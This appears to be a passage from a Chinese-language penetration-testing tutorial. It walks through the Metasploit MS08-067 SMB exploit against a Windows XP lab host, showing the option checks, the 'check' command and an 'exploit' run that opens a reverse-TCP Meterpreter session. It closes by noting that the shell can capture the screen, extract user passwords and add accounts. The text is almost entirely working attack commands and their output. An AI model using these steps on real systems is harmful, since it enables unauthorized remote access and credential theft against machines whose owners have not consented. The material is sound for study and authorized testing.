1、检查有效性


在对目标实施渗透攻击前，可以使用check命令检查当前目标主机是否支持漏洞攻击载荷，以及配置选项是否有效。


检查模块的有效性。具体操作如下：


1）查看下当前模块的配置项。执行命令如下：


msf5 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

Name     Current Setting   Required   Description

-----    ---------------   --------  -------------

RHOSTS    192.168.1.104   yes  The target address range or CIDR identifier

RPORT   445   yes   The SMB service port (TCP)

SMBPIPE  BROWSER   yes  The pipe name to use (BROWSER,SRVSVC)

Exploit target:

Id  Name

--  ------------------------------

0   Automatic Targeting


从输出的结果中可以看到，当前模块的所有配置项都已配置。接下来，检查该模块的有效性。


2）检查模块的有效性。执行命令如下：


msf5 exploit(windows/smb/ms08_067_netapi) > check

[+] 192.168.1.104:445 The target is vulnerable.


从输出的结果中可以看到，指定的目标主机可以利用该漏洞实施攻击。


在Metasploit中，并不是每个exploit模块都支持check命令。


2、执行攻击


通过前面的操作，渗透攻击模块和攻击载荷就设置完成了。接下来即可对目标实施渗透攻击。


1）为了确认所有的配置信息都正确，在使用攻击之前可再次查看所有的配置选项信息。具体如下：


msf5 exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

Name    Current Setting   Required   Description

-----   ---------------  ---------  -------------

RHOSTS 192.168.1.104  yes The target address range or CIDR  identifier

RPORT  445  yes  The SMB service port

SMBPIPE  BROWSER  yes The pipe name to use(BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):

Name    Current Setting   Required  Description

-----   ---------------  ---------  -------------

EXITFUNC thread yes Exit technique (Accepted: '', seh,thread, process, none)

LHOST  192.168.1.105  yes  The listen address

LPORT   4444   yes  The listen port

Exploit target:

Id  Name

--  ------------------------------------------------

2   Windows XP SP0/SP1 Universal


从输出的结果中可以看到，所有的配置项都已设置好。此时即可对目标实施渗透攻击。


2）实施渗透攻击。执行命令如下：


msf5 exploit(ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 192.168.1.105:4444

[*] 192.168.1.104:445 - Attempting to trigger the vulnerability...

[*] Sending stage (957999 bytes) to 192.168.1.104

[*] Meterpreter session 1 opened (192.168.1.105:4444 -> 192.168.1.104:1059) 

at 2019-05-07 17:20:51 +0800

meterpreter >


从输出的信息中可以看到，Meterpreter会话1被打开了。看到meterpreter>提示符，表示渗透攻击成功，也就是实施攻击的主机成功地远程连接到了Windows系统。此时，可以在Meterpreter Shell下执行很多的命令，如捕获屏幕信息、提取用户密码、添加用户等。
